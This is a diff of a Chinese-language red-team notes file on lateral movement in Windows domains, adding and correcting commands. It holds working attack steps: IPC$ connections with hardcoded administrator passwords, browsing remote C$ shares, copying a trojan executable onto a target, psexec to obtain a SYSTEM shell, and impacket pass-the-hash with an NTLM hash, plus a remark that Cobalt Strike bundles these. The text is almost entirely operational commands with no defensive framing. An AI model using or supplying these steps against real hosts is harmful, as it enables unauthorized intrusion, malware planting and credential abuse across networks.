@@ -3,6 +3,12 @@
     主机开启139和445端口，IPC移动  
     shell net use \\192.168.10.23\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
     
+    查看远程主机文件
+    
+    
+    dir \\192.168.52.143\c$
+    dir \\192.168.52.143\c$\xx文件夹
+    
     在本地传个马，copy过去    
     shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
       
@@ -31,8 +37,8 @@
     
     1.psexec 需要建立ipc连接进行横向移动
     
-     net use \\192.168.3.144\ip$ “admin!@#45” /uesr:administrator  #建立IPC链接，出现弹框点击agree
-     psexec \\192.168.3.64 -s cmd cmd  #-s,表示以system权限运行窗口，成功返回目标主机system权限窗口
+     net use \\192.168.3.144\ipc$ “admin!@#45” /user:"administrator"  #和对方建立IPC链接，出现弹框点击agree
+     psexec \\192.168.3.64 -s cmd cmd     #   -s,表示以system权限运行窗口，成功返回目标主机system权限窗口
      
     2.ps不需要建立ipc连接进行横向移动
     
@@ -45,6 +51,8 @@
       impacket工具包里有个psexec，可进行密文传递攻击，下载地址：https://github.com/maaaaz/impacket-examples-windows
       
       psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144
+      
+    以上方法CS里自带该功能。
 
 ## 0x03 横向移动方法4_票据攻击
 
